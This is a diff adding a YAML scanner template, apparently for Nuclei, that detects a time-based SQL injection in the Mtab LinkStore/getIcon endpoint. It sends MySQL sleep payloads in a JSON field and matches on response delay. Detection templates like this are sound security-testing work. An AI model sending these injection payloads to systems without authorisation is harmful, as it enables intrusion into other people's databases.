@@ -1,0 +1,48 @@
+id: poc-yaml-tsxcw-mtab-geticon-sqli
+info:
+  name: Mtab LinkStore/getIcon SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template detects an SQL injection vulnerability in the Mtab LinkStore/getIcon endpoint by leveraging time-based SQL payloads to measure response delays.
+variables:
+  t1: "{{rand_int(5,9)}}"
+  t2: "{{to_number(t1) + 2}}"
+  t3: "{{rand_int(1,4)}}"
+  t4: "{{to_number(t3) + 2}}"
+http:
+  - raw:
+      - |
+        POST /LinkStore/getIcon HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"url":"'XOR(if(now()=sysdate(),sleep({{t1}}),0))XOR'"}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: dsl
+        dsl:
+          - "duration >= to_number(t1)"
+          - "duration <= to_number(t2)"
+          - "contains(body, '未查询到相关信息')"
+          - "contains(body, '\"msg\":\"no\"')"
+  - raw:
+      - |
+        POST /LinkStore/getIcon HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"url":"'XOR(if(now()=sysdate(),sleep({{t3}}),0))XOR'"}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: dsl
+        dsl:
+          - "duration >= to_number(t3)"
+          - "duration <= to_number(t4)"
+          - "contains(body, '未查询到相关信息')"
+          - "contains(body, '\"msg\":\"no\"')"
